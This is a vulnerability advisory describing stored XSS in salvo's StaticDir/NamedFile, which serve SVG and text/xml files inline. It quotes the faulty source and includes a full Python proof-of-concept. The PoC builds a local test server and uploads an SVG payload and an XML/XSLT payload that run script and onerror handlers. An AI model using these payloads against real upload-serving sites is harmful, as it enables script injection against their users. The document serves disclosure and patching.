---
lang: en
title: "Stored XSS via `image/svg+xml` served `inline` by `StaticDir` / `NamedFile`"
project: salvo
cwe:
  - CWE-79
severity: medium
cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
score: "6.1"
verified: "0.95.2"
affected: ">= 0.3.0, <= 0.95.2"
patched: "0.96.0"
date: 2026-08-18
---

> [!info] Update
> 2026/08/21: This vulnerability was fixed in commit [f81876e](https://github.com/salvo-rs/salvo/commit/f81876e40d88d44f338973b3308630d41afb81e6).
> The minimum version containing this patch is `0.96.0`.

### Summary

`salvo_serve_static::StaticDir` (and the underlying `salvo_core::fs::NamedFile`) serves `image/svg+xml` and `text/xml` files with `Content-Disposition: inline` (and without `X-Content-Type-Options: nosniff`).

As a result, in typical configurations where user-uploaded files are served via `StaticDir`, a Stored XSS vulnerability exists. **An attacker can upload an SVG containing `<script>` tags and convince a victim to open its URL, executing arbitrary JavaScript within the serving origin.**

- **Affected Components:** `salvo-serve-static` (`StaticDir` / `StaticFile`), `salvo_core::fs::NamedFile`
- **Confirmed Version:** salvo `0.95.2`
- **Prerequisites:** The application statically serves attacker-controlled files (e.g., user uploads).

| Target             | Affected Versions    |
| ------------------ | -------------------- |
| salvo_core / salvo | >= 0.3.0, <= 0.95.2  |
| salvo-serve-static | >= 0.37.9, <= 0.95.2 |

> Note: `StaticEmbed` is not affected by this issue.  
> `render_embedded_data` (`crates/serve-static/src/embed.rs`) is a separate rendering path that does not go through `NamedFile` and never emits a `Content-Disposition` header, so it does not go through the classification logic described below. As a result, SVGs are displayed inline by the browser's default behavior, but the content being served is embedded at build time via `rust-embed` and is therefore not under an attacker's control, so a stored XSS does not arise.

---

### Details

#### Dangerous MIME Types Categorized as `inline`

`crates/core/src/fs/named_file.rs` (`fn build_content_disposition`, L415-425):

```rust
let disposition_type = disposition_type.unwrap_or_else(|| {
    if attached_name.is_some() {
        "attachment"
    } else {
        match (content_type.type_(), content_type.subtype()) {
            (mime::IMAGE | mime::TEXT | mime::VIDEO | mime::AUDIO, _) // ← image/* is categorized as inline
            | (_, mime::JAVASCRIPT | mime::JSON) => "inline",
            _ => "attachment",
        }
    }
});

```

Because `image/svg+xml` matches `type_() == mime::IMAGE`, it is categorized as **`inline`**.
Furthermore, SVG files can contain `<script>` tags or event handler attributes (such as `onload`). When rendered via top-level navigation or an `<iframe>`, **JavaScript can be executed within the serving origin**.
Note that `text/xml` (`type_() == mime::TEXT`) is also categorized as `inline`, leaving room for script execution via `<?xml-stylesheet ?>` (XSLT).

#### Internal Inconsistency in Classification

While this classification logic is designed to fail safe by defaulting **unrecognized types to `attachment**`, XML-related types have inconsistent handling: types like `application/xml`default to the safe side, whereas SVG and`text/xml` slip through.

| Content-Type            | `type/subtype` / `suffix`   | Disposition | Script Execution                   |
| ----------------------- | --------------------------- | ----------- | ---------------------------------- |
| `image/svg+xml`         | `image/svg` / `xml`         | **inline**  | **Yes** <- Issue                   |
| `text/xml`              | `text/xml` / -              | **inline**  | **Yes via XSLT** <- see Note       |
| `application/xml`       | `application/xml` / -       | attachment  | No                                 |
| `application/xhtml+xml` | `application/xhtml` / `xml` | attachment  | No                                 |
| `text/html`             | `text/html` / -             | inline      | Yes (by design for static servers) |

> Note: `application/xml` appears only if the developer explicitly sets the content type using `NamedFileBuilder::content_type()`. This is because `mime_infer::from_path` (`crates/serve-static/src/dir.rs:545`) maps `.xml` to `text/xml`.

#### Enabled by Default with No Override Mechanism

`Content-Disposition` is enabled by default.

`crates/core/src/fs/named_file.rs` (L54):

```rust
#[bitflags(default = Etag | LastModified | ContentDisposition)]
```

If no explicit setting is provided in `send_inner()`, the above classification is used to construct the header output.

`crates/core/src/fs/named_file.rs` (`fn send_inner`, L702-718):

```rust
if self.flags.contains(Flag::ContentDisposition) {
    if let Some(content_disposition) = self.content_disposition.take() {
        #...
    } else if !res.headers().contains_key(CONTENT_DISPOSITION) {
        // skip to set CONTENT_DISPOSITION header if it is already set.
        match build_content_disposition(&self.path, &self.content_type, None, None) {
            #...
        }
    }
}
```

Although `NamedFileBuilder` provides methods such as `disposition_type()`, `attached_name()`, and `disable_content_disposition()`, `StaticDir` and `StaticFile` expose no public API to invoke them.

```shell
$ grep -rn "disposition\|attached_name" crates/serve-static/src/
# 0 hits
```

#### Lack of Defense-in-Depth Measures Like `nosniff`

```shell
$ grep -rn "nosniff\|X-Content-Type-Options\|Content-Security-Policy" crates/ --include="*.rs"
# 0 hits
```

Responses from `NamedFile` or `StaticEmbed` do not include the `X-Content-Type-Options: nosniff` header.
Since SVG files are served with a valid MIME type, the absence of `nosniff` is not a prerequisite for this vulnerability; however, it demonstrates that such defense-in-depth hardening measures are absent.

---

### PoC

`poc.py` builds and launches a Salvo server equipped with image-only upload validation, demonstrating in order that: 1) HTML payloads are rejected by the validation, 2) SVG and XML pass the same validation, and 3) those SVG and XML files are served with `Content-Disposition: inline`.

`poc.py`

```python
#!/usr/bin/env python3
"""
Salvo StaticDir SVG / text-xml XSS PoC

On first run it builds the vulnerable Salvo server binary into the current
directory (./server); afterwards it reuses that binary (rebuilding
automatically when this script's embedded Rust source changes).

Steps:
  0. Build ./server if missing or stale.
  1. Launch the server.
  2. Upload the SVG exploit      -> /upload      (image endpoint).
  3. Upload the XML + XSL exploit -> /upload-doc  (document endpoint).
  4. Keep the server running so the URLs can be opened in a browser.
"""

import hashlib
import http.client
import os
import shutil
import signal
import socket
import subprocess
import sys
import time
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = "127.0.0.1"
PORT = 5810
# Vulnerable server binary. Built into the current dir on first run if missing.
SERVER_BIN = os.environ.get("SERVER_BIN", os.path.join(HERE, "server"))
# Local salvo checkout the generated server depends on (for building).
SALVO_CRATE = os.path.join(HERE, "crates", "salvo")
BUILD_DIR = os.path.join(HERE, ".server-build")

UPLOAD_NAME = "poc.svg"
XML_NAME = "poc.xml"
XSL_NAME = "poc.xsl"

CARGO_TOML = f"""[package]
name = "server"
version = "0.0.0"
edition = "2021"
publish = false
[workspace]

[dependencies]
salvo = {{ path = "{SALVO_CRATE}", default-features = false, features = ["server", "http1", "serve-static"] }}
tokio = {{ version = "1", features = ["macros", "rt-multi-thread"] }}
"""

MAIN_RS = f"""
use std::fs::create_dir_all;
use std::path::Path;

use salvo::http::mime;
use salvo::prelude::*;
use salvo::serve_static::StaticDir;

/// Image-only allowlist, as a typical image-upload endpoint would enforce.
const ALLOWED_EXT: [&str; 6] = ["png", "jpg", "jpeg", "gif", "webp", "svg"];

/// Document endpoint blocklist. Models a developer who "already fixed SVG
/// XSS" by blocking the obviously-scriptable types, but still accepts XML.
const BLOCKED_EXT: [&str; 6] = ["html", "htm", "xhtml", "xht", "svg", "js"];

#[handler]
async fn upload(req: &mut Request, res: &mut Response) {{
    let Some(file) = req.file("file").await else {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("no file field"));
        return;
    }};
    let name = file.name().unwrap_or("upload").to_owned();

    // Validation 1: the extension must be an image extension.
    let ext = Path::new(&name)
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    if !ALLOWED_EXT.contains(&ext.as_str()) {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain(format!("rejected: extension {{ext:?}} not allowed")));
        return;
    }}

    // Validation 2: the declared Content-Type must be image/*.
    let is_image = file
        .content_type()
        .map(|m| m.type_() == mime::IMAGE)
        .unwrap_or(false);
    if !is_image {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("rejected: content-type is not image/*"));
        return;
    }}

    let dest = format!("uploads/{{name}}");
    match std::fs::copy(file.path(), Path::new(&dest)) {{
        Ok(_) => res.render(Text::Plain(format!("saved:{{name}}"))),
        Err(e) => {{
            res.status_code(StatusCode::INTERNAL_SERVER_ERROR);
            res.render(Text::Plain(format!("copy failed: {{e}}")));
        }}
    }}
}}

/// Generic document-upload endpoint. Blocklists html/svg/js (extension and
/// content-type) but accepts everything else -- including .xml and .xsl.
#[handler]
async fn upload_doc(req: &mut Request, res: &mut Response) {{
    let Some(file) = req.file("file").await else {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("no file field"));
        return;
    }};
    let name = file.name().unwrap_or("upload").to_owned();

    // Block by extension.
    let ext = Path::new(&name)
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    if BLOCKED_EXT.contains(&ext.as_str()) {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain(format!("rejected: extension {{ext:?}} is blocked")));
        return;
    }}

    // Block the obviously-scriptable content types too.
    let blocked_ct = file
        .content_type()
        .map(|m| {{
            let essence = m.essence_str();
            essence == "text/html"
                || essence == "image/svg+xml"
                || essence == "application/xhtml+xml"
                || essence.ends_with("javascript")
        }})
        .unwrap_or(false);
    if blocked_ct {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("rejected: content-type is blocked"));
        return;
    }}

    let dest = format!("uploads/{{name}}");
    match std::fs::copy(file.path(), Path::new(&dest)) {{
        Ok(_) => res.render(Text::Plain(format!("saved:{{name}}"))),
        Err(e) => {{
            res.status_code(StatusCode::INTERNAL_SERVER_ERROR);
            res.render(Text::Plain(format!("copy failed: {{e}}")));
        }}
    }}
}}

#[tokio::main]
async fn main() {{
    create_dir_all("uploads").unwrap();
    let router = Router::new()
        .push(Router::with_path("upload").post(upload))
        .push(Router::with_path("upload-doc").post(upload_doc))
        .push(Router::with_path("uploads/{{*path}}").get(StaticDir::new(["uploads"])));
    let acceptor = TcpListener::new("0.0.0.0:{PORT}").bind().await;
    Server::new(acceptor).serve(router).await;
}}
"""

SVG_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n'
    '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60"\n'
    '     onload="alert(\'XSS on \' + document.domain)">\n'
    "  <script>alert('XSS on ' + document.domain)</script>\n"
    '  <text x="10" y="35">salvo StaticDir SVG-XSS PoC</text>\n'
    "</svg>\n"
)

XML_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    f'<?xml-stylesheet type="text/xsl" href="{XSL_NAME}"?>\n'
    "<root>salvo StaticDir text/xml XSLT-XSS PoC</root>\n"
)

XSL_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<xsl:stylesheet version="1.0"\n'
    '    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'
    '  <xsl:output method="html"/>\n'
    '  <xsl:template match="/">\n'
    '    <html xmlns="http://www.w3.org/1999/xhtml">\n'
    "      <body>\n"
    "        <h2>salvo StaticDir text/xml XSLT-XSS PoC</h2>\n"
    "        <script>alert('XSLT-XSS on ' + document.domain)</script>\n"
    '        <img src="x" onerror="alert(\'XSLT-XSS(img) on \' + document.domain)"/>\n'
    "      </body>\n"
    "    </html>\n"
    "  </xsl:template>\n"
    "</xsl:stylesheet>\n"
)


STAMP_FILE = SERVER_BIN + ".stamp"


def source_hash():
    return hashlib.sha256((CARGO_TOML + MAIN_RS).encode()).hexdigest()


def needs_build():
    if not os.path.isfile(SERVER_BIN):
        return True
    try:
        with open(STAMP_FILE) as f:
            return f.read().strip() != source_hash()
    except OSError:
        return True


def log(msg):
    print(f"[poc] {msg}", flush=True)


def wait_port(timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection((HOST, PORT), timeout=1):
                return True
        except OSError:
            time.sleep(0.2)
    return False


def build_server():
    if shutil.which("cargo") is None:
        log("cargo not found on PATH (try running inside `nix develop`).")
        sys.exit(1)
    if not os.path.isdir(SALVO_CRATE):
        log(f"cannot find salvo crate at {SALVO_CRATE}")
        sys.exit(1)
    log(f"server binary not found; building into {SERVER_BIN} ...")
    if os.path.isdir(BUILD_DIR):
        shutil.rmtree(BUILD_DIR)
    os.makedirs(os.path.join(BUILD_DIR, "src"))
    with open(os.path.join(BUILD_DIR, "Cargo.toml"), "w") as f:
        f.write(CARGO_TOML)
    with open(os.path.join(BUILD_DIR, "src", "main.rs"), "w") as f:
        f.write(MAIN_RS)
    log("cargo build (first build compiles salvo; may take a few minutes)...")
    r = subprocess.run(["cargo", "build", "--quiet"], cwd=BUILD_DIR)
    if r.returncode != 0:
        log("build failed")
        sys.exit(1)
    shutil.copy2(os.path.join(BUILD_DIR, "target", "debug", "server"), SERVER_BIN)
    with open(STAMP_FILE, "w") as f:
        f.write(source_hash())
    log(f"built: {SERVER_BIN}")


def start_server():
    if needs_build():
        build_server()
    log(f"launching server: {SERVER_BIN}")
    proc = subprocess.Popen(
        [SERVER_BIN],
        cwd=os.path.dirname(SERVER_BIN) or ".",
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )
    if not wait_port():
        stop_server(proc)
        log("server did not open port in time")
        sys.exit(2)
    log(f"server listening on {HOST}:{PORT}")
    return proc


def upload_payload(filename, payload, content_type, endpoint="/upload"):
    boundary = "----salvopoc" + uuid.uuid4().hex
    body = bytearray()
    body += f"--{boundary}\r\n".encode()
    body += (
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
    ).encode()
    body += f"Content-Type: {content_type}\r\n\r\n".encode()
    body += payload.encode()
    body += f"\r\n--{boundary}--\r\n".encode()

    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
    conn.request(
        "POST",
        endpoint,
        body=bytes(body),
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
        },
    )
    resp = conn.getresponse()
    text = resp.read().decode(errors="replace")
    conn.close()
    log(f"upload {filename} -> HTTP {resp.status} {text!r}")
    return resp.status


def stop_server(proc):
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except ProcessLookupError:
        pass


def upload_exploits():
    # SVG exploit through the image-upload endpoint.
    if upload_payload(UPLOAD_NAME, SVG_PAYLOAD, "image/svg+xml", "/upload") != 200:
        raise RuntimeError("SVG upload failed")

    # text/xml + XSLT exploit through the document endpoint.
    if upload_payload(XML_NAME, XML_PAYLOAD, "text/xml", "/upload-doc") != 200:
        raise RuntimeError("XML upload failed")
    if upload_payload(XSL_NAME, XSL_PAYLOAD, "text/xml", "/upload-doc") != 200:
        raise RuntimeError("XSL upload failed")


def main():
    proc = start_server()
    try:
        upload_exploits()

        print(flush=True)
        log("exploits uploaded. Open these URLs in a browser (expect an alert box):")
        log(f"    SVG : http://{HOST}:{PORT}/uploads/{UPLOAD_NAME}")
        log(f"    XSLT: http://{HOST}:{PORT}/uploads/{XML_NAME}")
        log("server is running. Press Ctrl-C to stop.")
        proc.wait()
    except KeyboardInterrupt:
        print(flush=True)
        log("stopping server")
    finally:
        stop_server(proc)


if __name__ == "__main__":
    main()
```

After running the above PoC, opening `[http://127.0.0.1:5810/uploads/poc](http://127.0.0.1:5810/uploads/poc).{svg/xml/xsl}` in a browser displays the XSS alert boxes.

```shell
$ curl -sD - -o /dev/null http://127.0.0.1:5810/uploads/poc.svg
HTTP/1.1 200 OK
content-disposition: inline
content-type: image/svg+xml
#...

$ curl -sD - -o /dev/null http://127.0.0.1:5810/uploads/poc.xml
HTTP/1.1 200 OK
content-disposition: inline
content-type: text/xml; charset=utf-8
#...

$ curl -sD - -o /dev/null http://127.0.0.1:5810/uploads/poc.xsl
HTTP/1.1 200 OK
content-disposition: inline
content-type: text/xml; charset=utf-8
#...

```

---

### Impact

Arbitrary JavaScript execution within the serving origin allows standard Stored XSS impacts to be achieved.
